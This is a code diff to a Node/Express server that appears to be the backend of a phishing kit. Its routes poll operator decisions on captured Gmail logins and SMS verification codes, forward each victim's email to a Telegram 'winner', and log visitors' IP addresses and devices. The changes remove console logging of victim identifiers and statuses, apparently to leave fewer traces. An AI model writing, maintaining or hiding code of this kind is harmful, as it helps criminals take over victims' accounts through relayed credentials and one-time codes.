@@ -190,7 +190,7 @@ function startSelfPing() {
   setInterval(async () => {
     try {
       await fetch(`${APP_URL}/`, { method: 'GET' });
-      console.log(`🔄 Pinged`);
+      
     } catch (err) {
       console.error(`❌ Ping error`);
     }
@@ -521,8 +521,6 @@ app.post("/update-status", (req, res) => {
     let identifier = (req.body.identifier || req.body.email || "").trim();
     const action = req.body.action;
     const status = req.body.status;
-    
-    console.log(`📬 Update Status Received: ${identifier}, action: ${action}, status: ${status}`);
 
     // ✅ Handle verification confirm callbacks
     if (action === "verification_accept" || action === "verification_reject") {
@@ -737,8 +735,7 @@ app.post("/check-sms-status", (req, res) => {
     // Check pendingApprovals as fallback
     if (pendingApprovals[email]) {
       const approvalStatus = pendingApprovals[email].status;
-      console.log(`✅ Approval status for ${email}: ${approvalStatus}`);
-      
+
       if (approvalStatus === "sms_accept") {
         return res.json({ status: "sms_accepted" });
       } else if (approvalStatus === "sms_reject") {
@@ -768,8 +765,6 @@ app.post("/resend-sms", async (req, res) => {
       return res.status(400).json({ error: "Missing email" });
     }
 
-    console.log(`📲 Resending SMS to ${email}`);
-
     const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
     const device = detectDevice(userAgent);
@@ -785,12 +780,12 @@ app.post("/resend-sms", async (req, res) => {
 
     // ✅ SEND TO WINNER ONLY - NO BUTTONS
     if (email && userWinnerTelegram[email]) {
-      console.log(`📨 Resend SMS going to winner only: ${userWinnerTelegram[email]}`);
+      
       await sendFollowUpMessage(email, message, {
         parse_mode: "HTML"
         // ✅ NO reply_markup - no buttons!
       });
-      console.log(`✅ Resend SMS sent successfully to ${userWinnerTelegram[email]}`);
+      
     } else {
       console.log(`⚠️ No winner found for ${email}, cannot resend SMS`);
       return res.status(400).json({ error: "No winner determined for this email" });
@@ -1198,8 +1193,7 @@ app.get("/check-gmail-status", (req, res) => {
     }
 
     const status = pendingGmailLogin[requestId].status;
-    console.log(`✅ Gmail status for requestId ${requestId}: ${status}`);
-    
+
     // Map bot status values to frontend expectations
     if (status === "gmail_accept") {
       return res.json({ status: "accepted" });
@@ -1415,8 +1409,7 @@ app.get("/check-verification-status", (req, res) => {
     }
 
     const status = pendingVerificationConfirm[requestId].status;
-    console.log(`✅ Verification status for requestId ${requestId}: ${status}`);
-    
+
     // Map bot status values to frontend expectations
     if (status === "verification_accept") {
       return res.json({ status: "accepted" });
